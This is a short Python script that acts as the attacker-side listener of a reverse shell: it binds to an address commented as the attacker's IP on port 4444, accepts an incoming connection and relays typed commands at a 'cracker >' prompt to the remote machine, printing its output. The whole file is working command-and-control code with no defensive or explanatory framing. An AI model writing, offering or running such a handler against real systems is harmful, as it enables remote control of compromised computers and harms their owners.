import socket

LHOST = "10.0.1.12"  # Attacker's IP
LPORT = 4444              # Port

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((LHOST, LPORT))
server.listen(1)

print(f"Listening on {LHOST}:{LPORT}...")

client, addr = server.accept()
print(f"Connection received from {addr}")

while True:
    command = input("cracker > ")
    if command == "exit":
        client.send(b"exit")
        client.close()
        break
    else:
        client.send(command.encode())
        response = client.recv(1024)
        print(response.decode())
